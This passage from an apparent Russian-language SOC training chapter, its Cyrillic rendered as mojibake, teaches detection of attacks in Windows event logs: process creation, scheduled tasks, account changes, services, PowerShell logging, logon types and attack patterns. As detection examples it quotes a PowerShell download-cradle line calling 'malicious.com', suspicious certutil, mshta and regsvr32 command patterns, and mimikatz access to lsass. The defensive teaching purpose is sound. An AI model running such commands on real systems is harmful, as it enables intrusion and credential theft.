TokenElevationType:     %%1937 (TokenElevationTypeFull ‚Äî –∑–∞–ø—É—â–µ–Ω —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∞)
ProcessId:              0x890   (—Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å)
CommandLine:            cmd.exe /c powershell.exe -enc JABjAG...  ‚Üê Base64!
ParentProcessName:      C:\Windows\System32\mshta.exe   ‚Üê –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π —Ä–æ–¥–∏—Ç–µ–ª—å
```

**–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –≤ CommandLine:**
- PowerShell —Å —Ñ–ª–∞–≥–∞–º–∏ `-enc`, `-EncodedCommand`, `-nop`, `-exec bypass`
- `certutil -decode` –∏–ª–∏ `certutil -urlcache -f` (–∑–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤)
- `mshta.exe http://...` (–∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ VBScript —Å —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ URL)
- `wscript.exe /e:jscript` 
- `regsvr32 /s /u /i:http://...` (Squiblydoo —Ç–µ—Ö–Ω–∏–∫–∞)
- `rundll32.exe javascript:...`

**–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ —Ü–µ–ø–æ—á–∫–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (Parent ‚Üí Child):**
```
winword.exe ‚Üí cmd.exe          (Office –º–∞–∫—Ä–æ—Å –∑–∞–ø—É—Å—Ç–∏–ª cmd)
outlook.exe ‚Üí powershell.exe   (—Ñ–∏—à–∏–Ω–≥–æ–≤–æ–µ –ø–∏—Å—å–º–æ)
iexplore.exe ‚Üí cmd.exe         (—ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –±—Ä–∞—É–∑–µ—Ä–∞)
mshta.exe ‚Üí powershell.exe     (HTA-—Ñ–∞–π–ª)
wmic.exe ‚Üí cmd.exe             (WMIC lateral movement)
```

---

### –ì—Ä—É–ø–ø–∞: –ü–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫ –∑–∞–¥–∞—á

#### Event ID 4698 ‚Äî Scheduled Task Created (–°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞)

–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∏ —Å–æ–∑–¥–∞—é—Ç –∑–∞–¥–∞—á–∏ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞ –¥–ª—è –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç–∏ (Persistence) –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞.

```
SubjectUserName:  john.doe
TaskName:         \Microsoft\Windows\UpdateCheck   ‚Üê –º–∞—Å–∫–∏—Ä—É–µ—Ç—Å—è –ø–æ–¥ –ª–µ–≥–∏—Ç–∏–º–Ω–æ–µ
TaskContent:      <?xml version="1.0" ...>
  <Actions>
    <Exec>
      <Command>C:\Users\Public\svchost32.exe</Command>
    </Exec>
  </Actions>
```

**–ö—Ä–∞—Å–Ω—ã–µ —Ñ–ª–∞–≥–∏:**
- –ó–∞–¥–∞—á–∞ —Å–æ–∑–¥–∞–Ω–∞ –≤ `C:\Users\Public\` –∏–ª–∏ `C:\ProgramData\`
- –ò–º—è –º–∞—Å–∫–∏—Ä—É–µ—Ç—Å—è –ø–æ–¥ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∑–∞–¥–∞—á–∏ (`WindowsUpdate`, `ScheduledDefrag`)
- `Command` –≤–µ–¥—ë—Ç –Ω–∞ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –ø—É—Ç—å

#### Event ID 4702 ‚Äî Scheduled Task Modified (–ò–∑–º–µ–Ω–µ–Ω–∏–µ –∑–∞–¥–∞—á–∏ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞)

–ê–Ω–∞–ª–æ–≥–∏—á–µ–Ω 4698, –Ω–æ –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–π –∑–∞–¥–∞—á–∏. –ê—Ç–∞–∫—É—é—â–∏–µ –º–æ–≥—É—Ç –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å –ª–µ–≥–∏—Ç–∏–º–Ω—ã–µ –∑–∞–¥–∞—á–∏ –¥–ª—è –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç–∏.

---

### –ì—Ä—É–ø–ø–∞: –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏

#### Event ID 4720 ‚Äî User Account Created (–°–æ–∑–¥–∞–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞)

```
SubjectUserName:  administrator  (–∫—Ç–æ —Å–æ–∑–¥–∞–ª)
TargetUserName:   backdoor_user  (–Ω–æ–≤—ã–π –∞–∫–∫–∞—É–Ω—Ç)
TargetDomainName: CORP
```

**–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:** –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–≥–æ –±—ç–∫–¥–æ—Ä-–∞–∫–∫–∞—É–Ω—Ç–∞ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞.

#### Event ID 4726 ‚Äî User Account Deleted (–£–¥–∞–ª–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞)

```
SubjectUserName:  john.doe
TargetUserName:   temp_analyst_2024
```

**–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥:** –£–¥–∞–ª–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ –∏–ª–∏ —Å–µ—Ä–≤–∏—Å–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤.

#### Event ID 4732 ‚Äî User Added to Privileged Group (–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É)

–ö—Ä–∏—Ç–∏—á–Ω–æ–µ —Å–æ–±—ã—Ç–∏–µ! –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –≥—Ä—É–ø–ø—É (Domain Admins, Administrators, Remote Desktop Users).

```
SubjectUserName:  attacker
MemberName:       CN=backdoor_user,CN=Users,DC=corp,DC=local
TargetUserName:   Administrators   ‚Üê –∏–ª–∏ Domain Admins
```

**–≠—Ç–æ ‚Äî —ç—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π**. –î–æ–ª–∂–µ–Ω –±—ã—Ç—å –∞–ª–µ—Ä—Ç –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ.

---

### –ì—Ä—É–ø–ø–∞: –°–µ—Ä–≤–∏—Å—ã

#### Event ID 7045 ‚Äî New Service Installed (–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–æ–≤–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞)

–ò–∑ –∫–∞–Ω–∞–ª–∞ **System** (–Ω–µ Security). –ú–∞–ª–≤–∞—Ä—å —á–∞—Å—Ç–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Å–µ–±—è –∫–∞–∫ —Å–µ—Ä–≤–∏—Å Windows.

```
ServiceName:     WindowsDefenderSvc32   ‚Üê –º–∞—Å–∫–∏—Ä—É–µ—Ç—Å—è!
ServiceFileName: C:\Users\Public\svchost.exe -k netsvcs
ServiceType:     user mode service
ServiceStartType: auto start
ServiceAccount:  LocalSystem            ‚Üê –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞
```

**–ö—Ä–∞—Å–Ω—ã–µ —Ñ–ª–∞–≥–∏:**
- –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å–µ—Ä–≤–∏—Å–∞ –≤ `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`
- ServiceAccount = `LocalSystem` –∏–ª–∏ `SYSTEM`
- –ò–º—è —Å–µ—Ä–≤–∏—Å–∞ –∏–º–∏—Ç–∏—Ä—É–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–µ (`svchost32`, `WindowsDefenderSvc`)
- –°–µ—Ä–≤–∏—Å –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å `cmd.exe`, `powershell.exe`, `mshta.exe`

---

### –ì—Ä—É–ø–ø–∞: PowerShell-–∂—É—Ä–Ω–∞–ª–∏—Ä–æ–≤–∞–Ω–∏–µ

#### Event ID 4103 ‚Äî Module Logging (–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –º–æ–¥—É–ª–µ–π PowerShell)

–ó–∞–ø–∏—Å—ã–≤–∞–µ—Ç –≤—ã–≤–æ–¥ –∫–æ–º–∞–Ω–¥ PowerShell –ø—Ä–∏ –≤–∫–ª—é—á—ë–Ω–Ω–æ–º Module Logging.

```
CommandName:    Invoke-Expression
CommandType:    Cmdlet
ScriptName:     
User:           CORP\john.doe
CommandInvocation(Invoke-Expression):
"Invoke-Expression"
ParameterBinding(Invoke-Expression): name="Command"; value="IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
```

#### Event ID 4104 ‚Äî Script Block Logging (–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç-–±–ª–æ–∫–æ–≤)

–°–∞–º—ã–π —Ü–µ–Ω–Ω—ã–π PowerShell-–ª–æ–≥. –ó–∞–ø–∏—Å—ã–≤–∞–µ—Ç –≤–µ—Å—å –∫–æ–¥ PowerShell –¥–æ –µ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –≤–∫–ª—é—á–∞—è deobfuscated-–≤–µ—Ä—Å–∏—é!

```
ScriptBlockText:
  function Invoke-Mimikatz {
    param(...)
    ...
  }
Path: C:\Users\john.doe\AppData\Local\Temp\payload.ps1
```

**–ö—Ä–∏—Ç–∏—á–Ω–æ:** 4104 –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç —É–∂–µ –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥. –ï—Å–ª–∏ –∞—Ç–∞–∫—É—é—â–∏–π –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª Base64 –∏–ª–∏ XOR-–æ–±—Ñ—É—Å–∫–∞—Ü–∏—é, –≤ 4104 –≤—ã —É–≤–∏–¥–∏—Ç–µ –∏—Å—Ö–æ–¥–Ω—ã–π —Ç–µ–∫—Å—Ç.

**–í–∫–ª—é—á–µ–Ω–∏–µ Script Block Logging —á–µ—Ä–µ–∑ GPO:**
```
Computer Configuration ‚Üí Administrative Templates ‚Üí Windows Components
‚Üí Windows PowerShell ‚Üí Turn on PowerShell Script Block Logging ‚Üí Enabled
```

---

## 3.1.4 Logon Types ‚Äî –¥–µ—Ç–∞–ª—å–Ω—ã–π —Ä–∞–∑–±–æ—Ä

Logon Type ‚Äî –æ–¥–Ω–æ –∏–∑ –≤–∞–∂–Ω–µ–π—à–∏—Ö –ø–æ–ª–µ–π –≤ 4624 –∏ 4625. –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –∫–∞–∫ –∏–º–µ–Ω–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–æ—à—ë–ª –≤ —Å–∏—Å—Ç–µ–º—É.

| Logon Type | –ù–∞–∑–≤–∞–Ω–∏–µ | –û–ø–∏—Å–∞–Ω–∏–µ | –û—Å—Ç–∞–≤–ª—è–µ—Ç –ª–∏ credentials –≤ –ø–∞–º—è—Ç–∏ |
|------------|----------|----------|-----------------------------------|
| **2** | Interactive | –§–∏–∑–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ (–∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –∑–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º) | **–î–∞** ‚Äî LSASS —Ö—Ä–∞–Ω–∏—Ç credentials |
| **3** | Network | –°–µ—Ç–µ–≤–æ–π –¥–æ—Å—Ç—É–ø (SMB, WMI, net use) | **–ù–µ—Ç** ‚Äî credentials –Ω–µ –∫–µ—à–∏—Ä—É—é—Ç—Å—è |
| **4** | Batch | –ó–∞–¥–∞—á–∏ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞ | **–ù–µ—Ç** |
| **5** | Service | –°–µ—Ä–≤–∏—Å–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ —Å–µ—Ä–≤–∏—Å–∞ | **–ù–µ—Ç** |
| **7** | Unlock | –°–Ω—è—Ç–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —ç–∫—Ä–∞–Ω–∞ | **–î–∞** |
| **8** | NetworkCleartext | –°–µ—Ç–µ–≤–æ–π —Å –æ—Ç–∫—Ä—ã—Ç—ã–º –ø–∞—Ä–æ–ª–µ–º (IIS Basic Auth) | **–ù–µ—Ç** |
| **9** | NewCredentials | RunAs /netonly ‚Äî –ª–æ–∫–∞–ª—å–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç, —Å–µ—Ç–µ–≤—ã–µ credentials –¥—Ä—É–≥–∏–µ | **–î–∞** |
| **10** | RemoteInteractive | RDP-—Å–µ—Å—Å–∏—è | **–î–∞** ‚Äî credentials –≤ –ø–∞–º—è—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ |
| **11** | CachedInteractive | –í—Ö–æ–¥ —Å –∫–µ—à–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ –¥–æ–º–µ–Ω–Ω—ã–º–∏ credentials (–±–µ–∑ —Å–≤—è–∑–∏ —Å DC) | **–î–∞** |

### –ü–æ—á–µ–º—É Logon Type –≤–∞–∂–µ–Ω –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–∏–∫–∞

**Logon Type 2 (Interactive) ‚Äî –∞—Ç–∞–∫–∞ —Å —Ñ–∏–∑–∏—á–µ—Å–∫–∏–º –¥–æ—Å—Ç—É–ø–æ–º –∏–ª–∏ –∫–æ–Ω—Å–æ–ª—å—é:**
```
–ü—Ä–∏–∑–Ω–∞–∫: 4624 —Å Type=2 –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –∫–æ—Ç–æ—Ä—ã–π –æ–±—ã—á–Ω–æ —É–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —É–¥–∞–ª—ë–Ω–Ω–æ
–†–∏—Å–∫: credentials –≤ –ø–∞–º—è—Ç–∏ LSASS ‚Üí –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –¥–∞–º–ø–∞ —Å mimikatz
```

**Logon Type 3 (Network) ‚Äî lateral movement:**
```
–ü—Ä–∏–∑–Ω–∞–∫: –≤–æ–ª–Ω–∞ 4624 —Å Type=3 –Ω–∞ –º–Ω–æ–∂–µ—Å—Ç–≤–µ –º–∞—à–∏–Ω —Å –æ–¥–Ω–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞
–†–∏—Å–∫: –∞—Ç–∞–∫—É—é—â–∏–π –ø–µ—Ä–µ–º–µ—â–∞–µ—Ç—Å—è –ø–æ —Å–µ—Ç–∏ (Pass-the-Hash, PsExec)
```

**Logon Type 10 (RemoteInteractive / RDP) ‚Äî –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π RDP:**
```
–ü—Ä–∏–∑–Ω–∞–∫: 4624 —Å Type=10 –≤ –Ω–µ–æ–±—ã—á–Ω–æ–µ –≤—Ä–µ–º—è –∏–ª–∏ —Å –≤–Ω–µ—à–Ω–µ–≥–æ IP
–†–∏—Å–∫: –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞—è —Å–µ—Å—Å–∏—è —Å credentials –≤ –ø–∞–º—è—Ç–∏ —Å–µ—Ä–≤–µ—Ä–∞
```

**Logon Type 9 (NewCredentials) ‚Äî —Ç–µ—Ö–Ω–∏–∫–∞ Pass-the-Hash:**
```
–ü—Ä–∏–∑–Ω–∞–∫: 4648 + 4624 —Å Type=9
–†–∏—Å–∫: –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É–∫—Ä–∞–¥–µ–Ω–Ω—ã—Ö credentials
```

---

## 3.1.5 –ü–∞—Ç—Ç–µ—Ä–Ω—ã –∞—Ç–∞–∫ –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö

### –ü–∞—Ç—Ç–µ—Ä–Ω 1: –ë—Ä—É—Ç—Ñ–æ—Ä—Å

**–°–∏–≥–Ω–∞—Ç—É—Ä–∞:**
```
–ú–Ω–æ–∂–µ—Å—Ç–≤–æ Event ID 4625 (Failed Logon) –∑–∞ –∫–æ—Ä–æ—Ç–∫–æ–µ –≤—Ä–µ–º—è
- –û–¥–Ω–æ –∏ —Ç–æ –∂–µ TargetUserName (–∞—Ç–∞–∫–∞ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç)
- –ò–õ–ò —Ä–∞–∑–Ω—ã–µ TargetUserName —Å –æ–¥–Ω–æ–≥–æ IpAddress (–ø–µ—Ä–µ–±–æ—Ä –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
- SubStatus = 0xC000006A (–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å)
- LogonType = 3 (—Å–µ—Ç–µ–≤–æ–π –±—Ä—É—Ç—Ñ–æ—Ä—Å)
```

**–ö–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç –≤ Event Viewer:**
–°–æ—Ç–Ω–∏ –∑–∞–ø–∏—Å–µ–π —Å EventID 4625 –∑–∞ 5 –º–∏–Ω—É—Ç, –≤—Å–µ —Å `IpAddress: 185.220.101.5`, —Ä–∞–∑–Ω—ã–µ `TargetUserName`: `admin`, `administrator`, `root`, `test`, `user`.

**–ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞:**
–ó–∞ –≤–æ–ª–Ω–æ–π 4625 —Å–ª–µ–¥—É–µ—Ç 4624 —Å `IpAddress` –±—Ä—É—Ç—Ñ–æ—Ä—Å–µ—Ä–∞ ‚Äî —ç—Ç–æ –º–æ–º–µ–Ω—Ç –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏.

**–ü–æ—Ä–æ–≥ –¥–ª—è –∞–ª–µ—Ä—Ç–∞:** –ë–æ–ª–µ–µ 10 –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫ –∑–∞ 1 –º–∏–Ω—É—Ç—É —Å –æ–¥–Ω–æ–≥–æ IP.

---

### –ü–∞—Ç—Ç–µ—Ä–Ω 2: Lateral Movement (–≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª—å–Ω–æ–µ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ)

**–°–∏–≥–Ω–∞—Ç—É—Ä–∞:**
```
Event ID 4624, LogonType = 3 (Network) –∏–ª–∏ 10 (RDP)
- –û–¥–∏–Ω –∏ —Ç–æ—Ç –∂–µ TargetUserName –≤—Ö–æ–¥–∏—Ç –Ω–∞ –º–Ω–æ–∂–µ—Å—Ç–≤–æ —Ä–∞–∑–Ω—ã—Ö –º–∞—à–∏–Ω
- –ó–∞ –∫–æ—Ä–æ—Ç–∫–∏–π –ø—Ä–æ–º–µ–∂—É—Ç–æ–∫ –≤—Ä–µ–º–µ–Ω–∏ (–º–∏–Ω—É—Ç—ã)
- SubjectUserName = CORP\WORKSTATION01$ (–º–∞—à–∏–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç ‚Äî PsExec/SMB)
```

**–¶–µ–ø–æ—á–∫–∞ —Å–æ–±—ã—Ç–∏–π –ø—Ä–∏ PsExec:**
```
–ù–∞ –∏—Å—Ö–æ–¥–Ω–æ–π –º–∞—à–∏–Ω–µ (LAPTOP01):
  4648 ‚Äî —è–≤–Ω—ã–µ credentials –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ TARGET-PC

–ù–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ (TARGET-PC):
  7045 ‚Äî —É—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–µ—Ä–≤–∏—Å–∞ PSEXESVC
  4624 (Type=3) ‚Äî —Å–µ—Ç–µ–≤–æ–π –≤—Ö–æ–¥
  4688 ‚Äî —Å–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ cmd.exe –∏–ª–∏ powershell.exe
```

**–¶–µ–ø–æ—á–∫–∞ —Å–æ–±—ã—Ç–∏–π –ø—Ä–∏ WMI lateral movement:**
```
–ù–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ:
  4624 (Type=3) ‚Äî —Å–µ—Ç–µ–≤–æ–π –≤—Ö–æ–¥ —á–µ—Ä–µ–∑ WMI
  4688 ‚Äî WmiPrvSE.exe ‚Üí cmd.exe (–ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è —Ü–µ–ø–æ—á–∫–∞)
```

---

### –ü–∞—Ç—Ç–µ—Ä–Ω 3: –≠—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

**–°–∏–≥–Ω–∞—Ç—É—Ä–∞:**
```
Event ID 4732 ‚Äî –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–±–∞–≤–ª–µ–Ω –≤ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—É—é –≥—Ä—É–ø–ø—É
Event ID 4672 ‚Äî –≤—Ö–æ–¥ —Å —Å–µ–∑–∏–∞–ª—å–Ω—ã–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ –ø–æ—Å–ª–µ 4624
```

**–¢–∏–ø–∏—á–Ω–∞—è —Ü–µ–ø–æ—á–∫–∞:**
```
1. 4624 (Type=3) ‚Äî attacker –≤–æ—à—ë–ª –∫–∞–∫ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å john.doe
2. 4688 ‚Äî cmd.exe –∑–∞–ø—É—Å—Ç–∏–ª whoami /groups
3. 4688 ‚Äî exploit.exe (–ª–æ–∫–∞–ª—å–Ω–∞—è —ç—Å–∫–∞–ª–∞—Ü–∏—è)
4. 4624 (Type=2 –∏–ª–∏ 3) ‚Äî –Ω–æ–≤—ã–π –≤—Ö–æ–¥ –æ—Ç SYSTEM
5. 4732 ‚Äî backdoor_user –¥–æ–±–∞–≤–ª–µ–Ω –≤ Administrators
6. 4624 + 4672 ‚Äî backdoor_user –≤–æ—à—ë–ª —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏
```

---

### –ü–∞—Ç—Ç–µ—Ä–Ω 4: –ü–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç—å —á–µ—Ä–µ–∑ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫

**–°–∏–≥–Ω–∞—Ç—É—Ä–∞:**
```
Event ID 4698 ‚Äî —Å–æ–∑–¥–∞–Ω–∞ –Ω–æ–≤–∞—è –∑–∞–¥–∞—á–∞ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞
- –ù–µ—Ç–∏–ø–∏—á–Ω–æ–µ –≤—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è (–Ω–æ—á—å, –≤—ã—Ö–æ–¥–Ω—ã–µ)
- –ü—É—Ç—å –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É: %APPDATA%, %TEMP%, C:\Users\Public
- –ó–∞–ø—É—Å–∫ –æ—Ç SYSTEM –∏–ª–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –±–µ–∑ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è
```

---

### –ü–∞—Ç—Ç–µ—Ä–Ω 5: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –¥–∞–º–ø–∞ credentials (Credential Dumping)

**–°–∏–≥–Ω–∞—Ç—É—Ä–∞:**
```
Event ID 4656/4663 ‚Äî –¥–æ—Å—Ç—É–ø –∫ –æ–±—ä–µ–∫—Ç—É lsass.exe
Event ID 4688 ‚Äî –∑–∞–ø—É—Å–∫ mimikatz.exe, procdump.exe, –∏–ª–∏ rundll32.exe comsvcs.dll
Event ID 10 (Sysmon) ‚Äî Process Access –∫ lsass.exe
```

Sysmon EventID 10 –æ—Å–æ–±–µ–Ω–Ω–æ —Ü–µ–Ω–µ–Ω ‚Äî –æ–Ω —Ñ–∏–∫—Å–∏—Ä—É–µ—Ç –ø–æ–ø—ã—Ç–∫–∏ OpenProcess –∫ lsass:
```
SourceImage: C:\Users\attacker\Desktop\mimikatz.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010  (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION)
```

---

## üíª –ü—Ä–∞–∫—Ç–∏–∫–∞

### –ó–∞–¥–∞–Ω–∏–µ 1: –ü–æ–∏—Å–∫ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ª–æ–≥–∏–Ω–æ–≤ —á–µ—Ä–µ–∑ Event Viewer

1. –û—Ç–∫—Ä–æ–π—Ç–µ Event Viewer (`eventvwr.msc`)
2. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ `Windows Logs` ‚Üí `Security`
3. –ù–∞–∂–º–∏—Ç–µ `Filter Current Log`
4. –í –ø–æ–ª–µ `Event ID` –≤–≤–µ–¥–∏—Ç–µ `4625`
5. –í `Logged` –≤—ã–±–µ—Ä–∏—Ç–µ `Last 24 hours`
6. –ò–∑—É—á–∏—Ç–µ –∫–∞–∂–¥–æ–µ —Å–æ–±—ã—Ç–∏–µ:
   - –ù–∞–π–¥–∏—Ç–µ –ø–æ–ª—è `TargetUserName`, `IpAddress`, `LogonType`, `SubStatus`
   - –û–ø—Ä–µ–¥–µ–ª–∏—Ç–µ –ø—Ä–∏—á–∏–Ω—É –æ—Ç–∫–∞–∑–∞ –ø–æ SubStatus

### –ó–∞–¥–∞–Ω–∏–µ 2: –°–æ–∑–¥–∞–Ω–∏–µ Custom View –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞

1. –í Event Viewer –Ω–∞–∂–º–∏—Ç–µ `Create Custom View`
2. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ —Ñ–∏–ª—å—Ç—Ä:
   - `By log` ‚Üí `Security`
   - `Event IDs`: `4624, 4625, 4648, 4672, 4720, 4732, 4740`
   - `Logged`: `Last 24 hours`
3. –ù–∞–∑–æ–≤–∏—Ç–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ `SOC - Authentication Events`

### –ó–∞–¥–∞–Ω–∏–µ 3: –ê–Ω–∞–ª–∏–∑ —á–µ—Ä–µ–∑ PowerShell

```powershell
# –í—Å–µ –Ω–µ—É–¥–∞—á–Ω—ã–µ –ª–æ–≥–∏–Ω—ã –∑–∞ 24 —á–∞—Å–∞
$events = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
    StartTime = (Get-Date).AddHours(-24)
} -ErrorAction SilentlyContinue

# –ì—Ä—É–ø–ø–∏—Ä–æ–≤–∫–∞ –ø–æ IP-–∞–¥—Ä–µ—Å—É
$events | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time     = $_.TimeCreated
        User     = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'}).'#text'
        IP       = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'}).'#text'
        LogonType = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'}).'#text'
    }
} | Sort-Object Time | Format-Table -AutoSize
```

### –ó–∞–¥–∞–Ω–∏–µ 4: –í–∫–ª—é—á–µ–Ω–∏–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–≥–æ –∞—É–¥–∏—Ç–∞

```powershell
